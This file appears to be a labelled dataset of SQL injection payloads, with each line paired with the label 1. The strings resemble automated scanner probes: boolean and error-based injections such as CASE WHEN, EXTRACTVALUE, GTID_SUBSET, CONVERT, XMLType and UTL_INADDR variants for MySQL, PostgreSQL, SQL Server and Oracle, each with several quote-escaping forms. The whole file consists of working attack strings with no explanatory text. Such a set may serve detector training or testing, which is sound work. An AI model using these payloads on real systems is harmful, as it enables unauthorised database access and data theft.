(CASE WHEN (6719=6719) THEN 6719 ELSE 6719*(SELECT 6719 FROM DUAL UNION SELECT 7139 FROM DUAL) END),1
(CASE WHEN (1694=5592) THEN 1694 ELSE 1694*(SELECT 1694 FROM DUAL UNION SELECT 5592 FROM DUAL) END),1
(CASE WHEN 9346=8267 THEN 9346 ELSE NULL END),1
(CASE WHEN 1110=1110 THEN 1110 ELSE NULL END),1
(CASE WHEN 6192=9570 THEN 6192 ELSE NULL END),1
"1,(SELECT (CASE WHEN (5181=7603) THEN 1 ELSE 5181*(SELECT 5181 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"1,(SELECT (CASE WHEN (3957=3957) THEN 1 ELSE 3957*(SELECT 3957 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"1,(SELECT (CASE WHEN (7825=4000) THEN 1 ELSE 7825*(SELECT 7825 FROM INFORMATION_SCHEMA.PLUGINS) END))",1
"1,(SELECT (CASE WHEN (2885=6236) THEN 1 ELSE 1/(SELECT 0) END))",1
"1,(SELECT (CASE WHEN (6175=6175) THEN 1 ELSE 1/(SELECT 0) END))",1
"1,(SELECT (CASE WHEN (9931=1411) THEN 1 ELSE 1/(SELECT 0) END))",1
"1) AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND (5165=5165",1
"1)) AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND ((4606=4606",1
"1 AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671))",1
"1 AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671))-- wskc",1
"1') AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND ('CaRD'='CaRD",1
"1')) AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND (('jUZs'='jUZs",1
"1' AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND 'Ocpz'='Ocpz",1
"1') AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND ('cDUr' LIKE 'cDUr",1
"1%' AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND 'zZFy%'='zZFy",1
"1' AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND 'KgCh' LIKE 'KgCh",1
"1"") AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND (""oJvb""=""oJvb",1
"1"" AND EXTRACTVALUE(3543,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(3543=3543,1))),0x717a627671)) AND ""BPWk""=""BPWk",1
"1) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND (1060=1060",1
"1)) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND ((7699=7699",1
"1 AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330)",1
"1 AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330)-- IZaX",1
"1') AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND ('oTqz'='oTqz",1
"1')) AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND (('yoGq'='yoGq",1
"1' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND 'dCJm'='dCJm",1
"1') AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND ('TDvy' LIKE 'TDvy",1
"1%' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND 'UTOR%'='UTOR",1
"1' AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND 'ZnCj' LIKE 'ZnCj",1
"1"") AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND (""IgVV""=""IgVV",1
"1"" AND GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(2330=2330,1))),0x717a627671),2330) AND ""nqSM""=""nqSM",1
1) AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (9944=9944,1
1)) AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ((3074=3074,1
1 AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC),1
1 AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC)-- RKTh,1
1') AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ('PHbQ'='PHbQ,1
1')) AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (('LXue'='LXue,1
1' AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'DYAI'='DYAI,1
1') AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ('kjwX' LIKE 'kjwX,1
1%' AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'NzVr%'='NzVr,1
1' AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND 'dSxt' LIKE 'dSxt,1
"1"") AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND (""XsNv""=""XsNv",1
"1"" AND 9950=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (9950=9950) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC) AND ""zFRx""=""zFRx",1
1) AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (5869=5869,1
1)) AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ((5453=5453,1
1 AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))),1
1 AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))-- PQnF,1
1') AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('EdeN'='EdeN,1
1')) AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (('ilrD'='ilrD,1
1' AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'Rose'='Rose,1
1') AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('dwUF' LIKE 'dwUF,1
1%' AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'mypr%'='mypr,1
1' AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'PKsS' LIKE 'PKsS,1
"1"") AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (""fmzX""=""fmzX",1
"1"" AND 5021 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5021=5021) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ""dMbv""=""dMbv",1
"1) AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (7786=7786",1
"1)) AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ((6175=6175",1
"1 AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))",1
"1 AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)))-- IFTD",1
"1') AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('zlGf'='zlGf",1
"1')) AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (('NrTX'='NrTX",1
"1' AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'zpcj'='zpcj",1
"1') AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ('TaiT' LIKE 'TaiT",1
"1%' AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'zfol%'='zfol",1
"1' AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND 'fkiF' LIKE 'fkiF",1
"1"") AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND (""jsYZ""=""jsYZ",1
"1"" AND 7969=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7969=7969) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))) AND ""Anfi""=""Anfi",1
"1) AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (2868=2868",1
"1)) AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ((6206=6206",1
"1 AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))",1
"1 AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113))-- XSXx",1
"1') AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ('PBYM'='PBYM",1
"1')) AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (('yDSM'='yDSM",1
"1' AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'APgF'='APgF",1
"1') AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ('OUJq' LIKE 'OUJq",1
"1%' AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'KDXp%'='KDXp",1
"1' AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND 'LcAU' LIKE 'LcAU",1
"1"") AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND (""FNLT""=""FNLT",1
"1"" AND 9904=CONCAT(CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (9904=9904) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(122)+CHAR(98)+CHAR(118)+CHAR(113)) AND ""BaCl""=""BaCl",1
1) AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (5968=5968,1
1)) AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((3093=3093,1
1 AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL),1
1 AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- NZKB,1
1') AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('rEkW'='rEkW,1
1')) AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (('SUfo'='SUfo,1
1' AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'uIVE'='uIVE,1
1') AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('zehg' LIKE 'zehg,1
1%' AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'CHMH%'='CHMH,1
1' AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'ecfp' LIKE 'ecfp,1
"1"") AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (""imEg""=""imEg",1
"1"" AND 9791=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (9791=9791) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ""NoEi""=""NoEi",1
1) AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (9573=9573,1
1)) AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ((9924=9924,1
1 AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)),1
1 AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113))-- uBQQ,1
1') AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ('KFmY'='KFmY,1
1')) AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (('aMJq'='aMJq,1
1' AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'UXTD'='UXTD,1
1') AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ('CLqK' LIKE 'CLqK,1
1%' AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'FaIW%'='FaIW,1
1' AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND 'pDmK' LIKE 'pDmK,1
"1"") AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND (""yYhD""=""yYhD",1
"1"" AND 6546=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (6546=6546) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AND ""GGOY""=""GGOY",1
"1) PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (4360=4360",1
"1)) PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ((1397=1397",1
"1 PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1)",1
"1 PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1)-- zhjc",1
"1') PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ('oCZj'='oCZj",1
"1')) PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (('ZQUh'='ZQUh",1
"1' PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'rBwf'='rBwf",1
"1') PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ('Bryl' LIKE 'Bryl",1
"1%' PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'hMsF%'='hMsF",1
